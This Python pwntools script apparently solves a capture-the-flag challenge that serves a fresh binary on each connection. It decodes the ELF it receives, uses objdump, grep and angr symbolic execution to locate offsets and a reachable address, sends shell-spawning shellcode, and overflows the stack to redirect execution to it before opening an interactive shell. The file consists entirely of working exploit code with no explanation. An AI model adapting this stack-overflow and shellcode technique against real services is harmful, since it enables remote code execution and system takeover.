#!/usr/bin/python -u
from pwn import *
import base64
import subprocess
import angr
context.arch = "amd64"
ip = "133.130.124.59"
port = 9991
s = remote(ip, port)
print(s.recvuntil("base64"))
program = s.recvuntil("NOW")
program = program[:program.find("NOW")]
elf = base64.b64decode(program)
with open('tmp','wb') as f:
    f.write(elf)
output = subprocess.check_output("objdump -d -M intel tmp | grep 'push   rbp' -A 4  | grep 'mov    edi,0x1' -B 4 | grep 'sub'",shell=True).strip()
print(output)
offset = int(output[output.find('rsp,')+4:],16) -8
print(offset)
output = subprocess.check_output("objdump -d -M intel tmp | grep 'mov    edx,0x64'",shell=True).strip()
print(output)
destination = int(output[:output.find(':')], 16)
print(hex(destination))
output = subprocess.check_output("objdump -d -M intel tmp | grep gets@plt -B 5 | grep read@plt -B 2",shell=True).splitlines()[0]
print(output)
sushi = int(output[output.find('esi,')+4:],16)
print(hex(sushi))
p = angr.Project("./tmp", load_options={'auto_load_libs': False})
ex = p.surveyors.Explorer(find=destination, enable_veritesting=True)
ex.run()
payload = ''
if ex.found:
    payload = ex.found[0].state.posix.dumps(0)
print(payload)
s.recvuntil('Guess what sushi looks like now!')
s.send(payload)
print(s.recvuntil('Now rewrite your sushi'))
s.send(asm(shellcraft.sh()).ljust(100,"a"))
s.sendline("a"*offset+"b"*8+p64(sushi))
s.interactive()
